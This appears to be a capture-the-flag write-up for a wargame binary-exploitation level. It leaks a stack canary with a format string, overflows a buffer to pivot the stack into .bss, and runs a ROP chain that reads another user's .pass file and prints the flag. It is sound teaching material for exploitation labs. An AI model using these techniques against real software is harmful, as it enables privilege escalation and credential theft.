Debugging the binary gives the following program flow in `main`:

```c
int main(void) {
    init_routing();
    print_banner();

    // Hardcoded routes added at startup
    add_route("FREESIDE", "GATEWAY_3", 3);
    add_route("VILLA_STRAYLIGHT", "TESSIER_GW", 5);

    relay_status();
    relay_data();
    print_routes();

    return 0;
}

```

The critical functions are `relay_status` and `relay_data`.

First, `relay_status` contains a format string vulnerability. Using the same leak calculation as prior levels, `%17$p` leaks the stack canary.

Next, analyzing `relay_data`:

```c
void relay_data(void) {
    char cmd_buf[48];
    unsigned int len;

    printf("[MAELCUM] Send it: ");
    fflush(stdout);

    read(0, cmd_buf, 64); // Reads 64 bytes into 48-byte buffer
    if (strncmp(cmd_buf, "RELAY:", 6) == 0) {
        len = (unsigned int)strtoul(cmd_buf + 6, NULL, 10);
        if (len > 511) {
            return;
        }
        printf("[MAELCUM] Ready for %u bytes: ", len);
        fflush(stdout);
        relay_len = read(0, relay_buf, len);
        printf("[MAELCUM] Relayed %u bytes.\n", relay_len);
    } else {
        puts("");
    }
}

```

Disassembly of `relay_data`:

```assembly
(gdb) disass relay_data 
Dump of assembler code for function relay_data:
   0x00000000004015a7 <+0>:     endbr64
   0x00000000004015ab <+4>:     push   %rbp
   0x00000000004015ac <+5>:     mov    %rsp,%rbp
   0x00000000004015af <+8>:     sub    $0x40,%rsp
   ....
   0x00000000004015e5 <+62>:    lea    -0x30(%rbp),%rax
   ....
   0x00000000004015f6 <+79>:    call   0x401160 <read@plt>

```

The `lea -0x30(%rbp), %rax` instruction places `cmd_buf` 48 bytes below `RBP`, meaning the stack canary sits immediately at offset 40 (`0x28`). Reading 64 bytes allows us to overwrite the canary (at byte 40), the saved `RBP` (at byte 48), and the saved `RIP` (at byte 56).

`relay_data` verifies that the input begins with `RELAY:`, parses `len` (up to 511 bytes), and reads those bytes into the global `relay_buf` inside the `.bss` section (`0x404200`). This allows us to perform a stack pivot to the `.bss` buffer using a `leave; ret` gadget.

We structure the exploit in two stages:

1. **Stage 1 (Stack Pivot via `cmd_buf`):**
* Payload: `b"RELAY:511" + padding (31 bytes) + canary + BSS_BUFFER_ADDRESS + ROP_LEAVE`
* Overwriting `RBP` with `0x404200` and `RIP` with `leave; ret` pivots `RSP` directly to `relay_buf`.


2. **Stage 2 (ROP Chain in `.bss`):**
* Execute `setreuid(1025, 1025)` for `flag08` (`UID: 1025`).
* `open("/home/flag08/.pass", O_RDONLY)` to retrieve the file descriptor (`fd = 3`).
* `read(3, buffer, 32)` to load the flag into memory.
* `write(1, buffer, 32)` to print the flag directly to `stdout`.
* `exit(3)` to cleanly terminate.

Check the ``exploit.py``.

**Execution & Flag Capture:**

```sh
level08@rainfall:~$ python3 exploit.py 
[+] Starting local process '/home/level08/maelcum': pid 1138
[+] Receiving all data: Done (61B)
[*] Process '/home/level08/maelcum' stopped with exit code 3 (pid 1138)
b'l3w1pdvtlapo1nmo8uttd1m0pen4iiuk'
```